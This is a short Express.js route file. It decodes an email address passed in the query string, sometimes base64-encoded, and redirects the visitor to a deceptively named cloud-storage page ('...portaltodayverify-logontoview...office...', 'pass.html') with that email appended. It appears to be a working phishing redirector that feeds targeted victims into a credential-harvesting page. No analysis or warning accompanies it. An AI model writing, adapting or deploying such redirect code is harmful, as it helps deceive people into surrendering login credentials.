var appRoute = function (app) {
  app.use(function (req, res, next) {
    res.setHeader(
      "Content-Security-Policy",
      "script-src 'self' 'unsafe-inline' https://vercel.live"
    );
    next();
  });

  app.all("/", function (req, res) {
    let email = req.query.email; // Use let instead of const to reassign

    if (email && email.includes("=")) {
      email = Buffer.from(email, "base64").toString("utf-8");
    }
    email = decodeURIComponent(email);

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (email && emailRegex.test(email)) {
      const redirect_url =
        "https://timesheetonlinenowportaltodayverify-logontoviewnowofficeicial.nl-ams-1.linodeobjects.com/pass.html#Q" +
        email;
      res.redirect(redirect_url);
    } else {
      res.status(400).send(""); // Add status code for error
    }
  });
};

module.exports = appRoute;
